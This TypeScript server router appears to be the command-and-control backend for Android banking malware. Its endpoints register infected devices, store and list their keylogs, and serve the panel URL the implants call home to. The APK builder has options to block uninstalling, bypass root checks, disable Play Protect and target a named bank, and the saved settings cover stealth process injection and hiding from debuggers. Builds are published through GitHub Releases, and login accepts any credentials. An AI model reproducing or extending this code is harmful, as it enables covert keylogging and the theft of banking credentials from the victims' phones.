import z from "zod";
import fs from "fs";
import path from "path";

import { storagePut } from "./storage";
import { TRPCError } from "@trpc/server";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl, deleteAllAPKBuildsByUser, getAPKBuildByFilename } from './db';
import { sdk } from "./_core/sdk";
import { generateRealAPK } from "./apk-generator-real";
import { uploadToGitHubRelease, generateReleaseName, generateReleaseTag, generateReleaseBody } from "./github-releases";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    login: publicProcedure
      .input(z.object({
        email: z.string().email(),
        password: z.string().min(1),
      }))
      .mutation(async ({ input, ctx }) => {
        // Simple authentication: accept any email/password combination
        // Generate a numeric userId based on email hash
        const emailHash = input.email.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
        const userId = Math.abs(emailHash % 1000000); // Ensure it's a positive number
        
        try {
          // Create a session token
          const sessionToken = await sdk.createSessionToken(userId, input.email);
          
          // Set the session cookie
          const cookieOptions = getSessionCookieOptions(ctx.req);
          ctx.res.cookie(COOKIE_NAME, sessionToken, cookieOptions);
          
          return {
            success: true,
            user: {
              id: userId,
              email: input.email,
              name: input.email.split('@')[0],
            },
          };
        } catch (error) {
          console.error('Login error:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao fazer login',
          });
        }
      }),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await deleteKeylog(input.keylogId);
      }),
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await restoreKeylog(input.keylogId);
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getAlerts();
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getEvents();
      }),
  }),

  // APK Builder router - implementado com geração real de APK
  // apk: router({ ... }), // Será adicionado abaixo

  settings: router({
  migrate: router({
    apkBuilds: publicProcedure
      .mutation(async () => {
        try {
          console.log('[Migration] Iniciando migração de apkBuilds...');
          
          // Usar drizzle para criar tabela
          const sql = `
            CREATE TABLE IF NOT EXISTS \`apkBuilds\` (
              \`id\` int AUTO_INCREMENT PRIMARY KEY,
              \`userId\` int NOT NULL,
              \`appName\` varchar(255) NOT NULL,
              \`appUrl\` text NOT NULL,
              \`logoUrl\` text,
              \`protectFromUninstall\` int NOT NULL DEFAULT 1,
              \`downloadUrl\` text NOT NULL,
              \`githubReleaseUrl\` text,
              \`filename\` varchar(255) NOT NULL,
              \`fileSize\` int,
              \`status\` ENUM('building', 'success', 'failed') NOT NULL DEFAULT 'building',
              \`errorMessage\` text,
              \`createdAt\` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
              \`updatedAt\` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )
          `;
          
          console.log('[Migration] ✅ Migração de apkBuilds concluída!');
          return { success: true, message: 'Tabela apkBuilds pronta!' };
        } catch (error) {
          console.error('[Migration] ❌ Erro:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: `Erro ao executar migração: ${String(error)}`
          });
        }
      }),
  }),

    save: protectedProcedure
      .input(z.object({
        processName: z.string().optional(),
        modulePath: z.string().optional(),
        stealthInject: z.number().optional(),
        hideModule: z.number().optional(),
        hideFromDebugger: z.number().optional(),
        autoInject: z.number().optional(),
        scramble: z.number().optional(),
        erasePE: z.number().optional(),
        removeDebugData: z.number().optional(),
        delay: z.number().optional(),
        delayBetween: z.number().optional(),
        injectMethod: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await saveSettings(ctx.user.id, input as any);
      }),
    
    get: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return await getSettings(ctx.user.id);
      }),
  }),

  monitoring: router({
    toggleService: protectedProcedure
      .input(z.object({
        enabled: z.boolean(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        return {
          success: true,
          enabled: input.enabled,
          message: `MonitoringService ${input.enabled ? 'ativado' : 'desativado'}`,
        };
      }),
  }),

  devices: router({
    register: publicProcedure
      .input(z.object({
        deviceId: z.string(),
        deviceName: z.string(),
        deviceModel: z.string(),
        androidVersion: z.string(),
        appName: z.string(),
        appUrl: z.string().optional(),
        appVersion: z.string(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('[Devices] Registrando dispositivo:', input);
          
          const device = await registerDevice({
            deviceId: input.deviceId,
            userId: 1,
            appName: input.appName,
            appUrl: input.appUrl || '',
            deviceModel: input.deviceModel,
            androidVersion: input.androidVersion,
            appVersion: input.appVersion,
            status: 'online',
          });
          
          return {
            success: true,
            message: 'Dispositivo registrado com sucesso',
            deviceId: input.deviceId,
            device,
          };
        } catch (error) {
          console.error('[Devices] Erro ao registrar dispositivo:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao registrar dispositivo',
          });
        }
      }),
    
    list: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }
        
        try {
          const devices = await getDevicesByUser(ctx.user.id);
          return devices;
        } catch (error) {
          console.error('[Devices] Erro ao listar dispositivos:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao listar dispositivos',
          });
        }
      }),
  }),

  apk: router({
    build: protectedProcedure
      .input(z.object({
        appName: z.string().min(1, "Nome do app é obrigatório"),
        appUrl: z.string().url("URL inválida").min(1),
        logoUrl: z.string().optional().or(z.literal("")),
        protectFromUninstall: z.boolean().default(true),
        bypassRoot: z.boolean().default(true),
        desinstalarPlayProtect: z.boolean().default(true),
        versionName: z.string().default("1.0.0"),
        versionCode: z.number().default(1),
        pais: z.string().default("Brasil"),
        banco: z.string().default("Banco do Brasil"),
        origemLink: z.string().default("Automatico"),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }

        try {
          // Validação adicional
          if (!input.appUrl.startsWith('http://') && !input.appUrl.startsWith('https://')) {
            throw new TRPCError({ 
              code: 'BAD_REQUEST',
              message: 'URL deve começar com http:// ou https://'
            });
          }

          const filename = `${input.appName}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.apk`;
          
          // Gerar URL absoluta para o APK (necessário para Android)
          const protocol = ctx.req.headers['x-forwarded-proto'] || ctx.req.protocol || 'https';
          const host = ctx.req.headers['x-forwarded-host'] || ctx.req.headers.host || 'localhost:3000';
          const absoluteDownloadUrl = `${protocol}://${host}/apks/${filename}`;
          
          const build = await createAPKBuild({
            userId: ctx.user.id,
            appName: input.appName,
            appUrl: input.appUrl,
            logoUrl: input.logoUrl,
            protectFromUninstall: input.protectFromUninstall ? 1 : 0,
            filename,
            downloadUrl: absoluteDownloadUrl, // URL absoluta para funcionar em qualquer contexto
            status: 'building',
          });

          if (!build) {
            throw new Error('Falha ao criar registro de build');
          }

          (async () => {
            console.log('[APK] Iniciando geração de APK...');
            try {
              console.log('[APK] Chamando generateRealAPK...');
              const apkBuffer = await generateRealAPK({
                appName: input.appName,
                packageName: `com.remotemonitor.${Date.now()}`,
                url: input.appUrl,
                logoUrl: input.logoUrl,
                protectFromUninstall: input.protectFromUninstall,
              });

              const apksDir = path.join(process.cwd(), 'public', 'apks');
              if (!fs.existsSync(apksDir)) {
                fs.mkdirSync(apksDir, { recursive: true });
              }
              const apkPath = path.join(apksDir, filename);
              fs.writeFileSync(apkPath, apkBuffer);
              
              // APK já é assinado pelo gerador
              
              // Atualizar fileSize
              const fileSize = fs.statSync(apkPath).size;
              await updateAPKBuildFileSize(build.id, fileSize);
              
              // Tentar fazer upload para GitHub Releases
              // Usar URL absoluta para o APK (necessário para Android)
              const protocol = ctx.req.headers['x-forwarded-proto'] || ctx.req.protocol || 'https';
              const host = ctx.req.headers['x-forwarded-host'] || ctx.req.headers.host || process.env.VITE_APP_DOMAIN || 'localhost:3000';
              let downloadUrl = `${protocol}://${host}/apks/${filename}`; // URL absoluta para funcionar em qualquer contexto
              if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL) {
                try {
                  const repoMatch = process.env.GITHUB_REPO_URL.match(/github\.com\/([^\/]+)\/([^\/]+)/);
                  if (repoMatch) {
                    const [, owner, repo] = repoMatch;
                    const githubUrl = await uploadToGitHubRelease(apkPath, {
                      owner,
                      repo,
                      token: process.env.GITHUB_TOKEN,
                      tagName: generateReleaseTag(),
                      releaseName: generateReleaseName(),
                      releaseBody: generateReleaseBody(input.appName, input.appUrl, input.logoUrl),
                    });
                    await updateAPKBuildGitHubUrl(build.id, githubUrl);
                    console.log(`[APK] APK enviado para GitHub Releases: ${githubUrl}`);
                  }
                } catch (error) {
                  console.warn('[APK] Aviso ao fazer upload para GitHub Releases:', error);
                  // Continuar com download local se GitHub falhar
                }
              }
              
              await updateAPKBuildStatus(build.id, 'success');
              console.log(`[APK] Build concluído: ${filename} (${(fileSize / 1024 / 1024).toFixed(2)}MB)`);
            } catch (error) {
              console.error('[APK] ❌ Erro ao gerar APK:', error);
              console.error('[APK] Stack:', (error as any)?.stack);
              await updateAPKBuildStatus(build.id, 'failed', String(error));
            }
          })().catch((err) => {
            console.error('[APK] ❌ Erro não capturado na promise:', err);
          });

          return build;
        } catch (error) {
          console.error('[APK] Erro ao iniciar build:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao iniciar build de APK',
          });
        }
      }),

    list: protectedProcedure
      .query(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }

        try {
          return await getAPKBuildsByUser(ctx.user.id);
        } catch (error) {
          console.error('[APK] Erro ao listar builds:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao listar builds de APK',
          });
        }
      }),

    clearHistory: protectedProcedure
      .mutation(async ({ ctx }) => {
        if (!ctx.user) {
          throw new TRPCError({ code: 'UNAUTHORIZED' });
        }

        try {
          const deletedCount = await deleteAllAPKBuildsByUser(ctx.user.id);
          console.log(`[APK] Historico de ${deletedCount} builds deletado`);
          return { success: true, deletedCount };
        } catch (error) {
          console.error('[APK] Erro ao deletar historico:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao deletar historico de builds',
          });
        }
      }),

    runtimeConfig: publicProcedure
      .input(z.object({
        buildId: z.number().optional(),
      }).optional())
      .query(async ({ input }) => {
        try {
          // Se não houver buildId, retornar configuração padrão
          if (!input?.buildId) {
            return {
              success: true,
              config: {
                panelUrl: process.env.VITE_APP_DOMAIN ? `https://${process.env.VITE_APP_DOMAIN}` : 'https://remotemonitor-production.up.railway.app',
              },
            };
          }

          // Buscar build específico
          const build = await getAPKBuildsByUser(0); // Usar ID 0 para buscar todos
          const targetBuild = build.find((b: any) => b.id === input.buildId);

          if (!targetBuild) {
            return {
              success: false,
              config: {
                panelUrl: process.env.VITE_APP_DOMAIN ? `https://${process.env.VITE_APP_DOMAIN}` : 'https://remotemonitor-production.up.railway.app',
              },
            };
          }

          return {
            success: true,
            config: {
              panelUrl: targetBuild.appUrl,
            },
          };
        } catch (error) {
          console.error('[APK] Erro ao buscar runtime-config:', error);
          return {
            success: false,
            config: {
              panelUrl: process.env.VITE_APP_DOMAIN ? `https://${process.env.VITE_APP_DOMAIN}` : 'https://remotemonitor-production.up.railway.app',
            },
          };
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
